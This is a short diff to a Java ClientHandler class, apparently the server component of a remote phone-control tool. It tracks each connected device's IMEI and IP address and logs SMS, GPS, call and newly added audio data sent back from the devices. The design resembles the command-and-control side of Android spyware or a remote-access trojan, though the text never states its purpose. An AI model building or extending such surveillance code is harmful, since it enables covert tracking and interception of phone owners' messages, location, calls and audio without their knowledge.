@@ -9,10 +9,12 @@ public class ClientHandler implements Runnable {
     private ServerGUI gui;
     private String deviceInfo = "Unknown";
     private String imei = "Unknown";
+    private String clientIP = "Unknown";
 
     public ClientHandler(Socket socket, ServerGUI gui) {
         this.socket = socket;
         this.gui = gui;
+        this.clientIP = socket.getInetAddress().getHostAddress();
         
         try {
             this.in = new DataInputStream(socket.getInputStream());
@@ -33,14 +35,12 @@ public class ClientHandler implements Runnable {
                 if (parts.length >= 4) {
                     deviceInfo = parts[1] + " (" + parts[2] + ")";
                     imei = parts[3];
-                    gui.log("Device info: " + deviceInfo + " - IMEI: " + imei);
                 }
             }
 
             // Listen for commands
             while (true) {
                 String command = in.readUTF();
-                gui.log("Response from " + deviceInfo + ": " + command);
                 processResponse(command);
             }
         } catch (EOFException e) {
@@ -55,11 +55,13 @@ public class ClientHandler implements Runnable {
     private void processResponse(String response) {
         // Process responses from client
         if (response.startsWith("SMS:")) {
-            gui.log("SMS Status: " + response.substring(4));
+            gui.log("[SMS] " + deviceInfo + ": " + response.substring(4));
         } else if (response.startsWith("GPS:")) {
-            gui.log("GPS Location: " + response.substring(4));
+            gui.log("[GPS] " + deviceInfo + ": " + response.substring(4));
         } else if (response.startsWith("CALL:")) {
-            gui.log("Call Status: " + response.substring(5));
+            gui.log("[CALL] " + deviceInfo + ": " + response.substring(5));
+        } else if (response.startsWith("AUDIO:")) {
+            gui.log("[AUDIO] " + deviceInfo + ": " + response.substring(6));
         }
     }
 
@@ -74,5 +76,9 @@ public class ClientHandler implements Runnable {
 
     public String getIMEI() {
         return imei;
+    }
+    
+    public String getClientIP() {
+        return clientIP;
     }
 }
